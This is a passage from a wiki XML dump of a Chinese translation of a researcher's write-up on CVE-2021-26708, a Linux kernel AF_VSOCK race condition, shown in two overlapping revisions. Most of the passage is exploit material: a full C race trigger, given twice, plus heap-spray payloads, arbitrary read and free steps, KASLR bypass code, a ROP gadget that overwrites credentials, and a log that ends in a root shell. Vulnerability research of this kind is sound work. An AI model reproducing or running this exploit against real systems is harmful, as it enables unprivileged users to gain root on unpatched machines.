	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;translate&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/translate&gt;

&lt;translate&gt;
==四字節的力量==
&lt;/translate&gt;

&lt;translate&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。

第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/translate&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;translate&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/translate&gt;

&lt;translate&gt;
==內核信息洩露==
&lt;/translate&gt;

&lt;translate&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/translate&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;translate&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/translate&gt;

&lt;translate&gt;
==實現任意讀==
&lt;/translate&gt;

&lt;translate&gt;
===從 arbitrary free 到 use-after-free===
&lt;/translate&gt;

&lt;translate&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/translate&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;translate&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/translate&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;translate&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/translate&gt;

&lt;translate&gt;
===任意讀的步驟===
&lt;/translate&gt;

&lt;translate&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/translate&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;translate&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/translate&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;translate&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/translate&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;translate&gt;
==尋找攻擊目標==
&lt;/translate&gt;

&lt;translate&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。

下面是該漏洞如何從內存中提取這些指針:
&lt;/translate&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;translate&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/translate&gt;

&lt;translate&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。

我構建了以下步驟：

1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字

2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()

3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()

4.對vsock_sock執行任意讀取過程

5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)

6.對這個可能的sk_buff地址執行任意讀

7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6

8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上

9.對sk_buff內核地址進行任意釋放

10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads

11.使用recv()接收服務器套接字的網絡消息。
&lt;/translate&gt;

&lt;translate&gt;
==通過skb_shared_info 進行任意寫==
&lt;/translate&gt;

&lt;translate&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/translate&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;translate&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/translate&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;translate&gt;
下面講講destructor_arg 回調:
&lt;/translate&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;translate&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。

callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/translate&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;translate&gt;
==視頻==
&lt;/translate&gt;
https://www.youtube.com/watch?v=EC8PFOYOUgU

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>kvuupkcyhqi6t2mda7h3cwnsroe0br3</sha1>
    </revision>
    <revision>
      <id>2093</id>
      <parentid>2092</parentid>
      <timestamp>2021-05-04T03:23:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* 視頻 */</comment>
      <origin>2093</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="24854" sha1="kihurljgkztjd1ay3rzvzy58khjmruk" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==脆弱點==
&lt;/translate&gt;

&lt;translate&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/translate&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;translate&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/translate&gt;


&lt;translate&gt;
==內存破壞==
&lt;/translate&gt;

&lt;translate&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/translate&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;translate&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/translate&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;translate&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/translate&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;translate&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。

內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/translate&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;translate&gt;
这里，vvs是指向内核内存的指针，它已经在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被释放。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小为64字节，位于kmalloc-64块缓存中。buf_alloc字段类型为u32，位于偏移量40。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。*val的值由攻击者控制，它的四个最不重要的字节被写入释放的内存中。
&lt;/translate&gt;

&lt;translate&gt;
==模糊測試==
&lt;/translate&gt;

&lt;translate&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/translate&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;translate&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/translate&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;translate&gt;
